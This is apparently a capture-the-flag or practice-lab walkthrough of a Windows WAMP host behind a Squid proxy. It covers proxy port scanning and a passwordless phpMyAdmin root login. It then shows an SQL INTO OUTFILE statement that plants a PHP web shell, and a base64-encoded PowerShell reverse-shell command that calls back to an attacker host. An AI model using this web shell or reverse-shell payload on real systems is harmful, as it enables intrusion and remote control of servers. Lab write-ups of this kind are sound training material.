```
nmap -sC -sV -Pn -p- 192.168.160.189
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-26 10:04 CDT
Stats: 0:17:03 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 7.23% done; ETC: 14:00 (3:38:41 remaining)
Nmap scan report for 192.168.160.189
Host is up (0.042s latency).
Not shown: 65532 filtered tcp ports (no-response), 2 filtered tcp ports (net-unreach)
PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.14

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1618.68 seconds
```

Was not able to nmap with proxychains. Found the following article:

https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid

Ran spose instead and found open ports

```
└─$ python3 spose.py --proxy http://192.168.160.189:3128 --target 192.168.160.189
Using proxy address http://192.168.160.189:3128
192.168.160.189 3306 seems OPEN 
192.168.160.189 8080 seems OPEN 
```

It took me to a WAMPSERVER which had other services listed. Checked out phpinfo() to find out where the server exists.

```
http://192.168.160.189:8080/?phpinfo=-1

|DOCUMENT_ROOT|C:/wamp/www|
```

I then logged into the phpmyadmin with root and no password. I was then able to run the SQL command below to write to the WAMP Directory to run commands.

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\wamp\\www\\backdoor.php"
```

Visited this with the powershell command for a reverse shell back.

```
http://192.168.160.189:8080/backdoor.php?cmd=powershell%20-nop%20-w%20hidden%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA2ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

User I had was an administrator by default and I found both flags.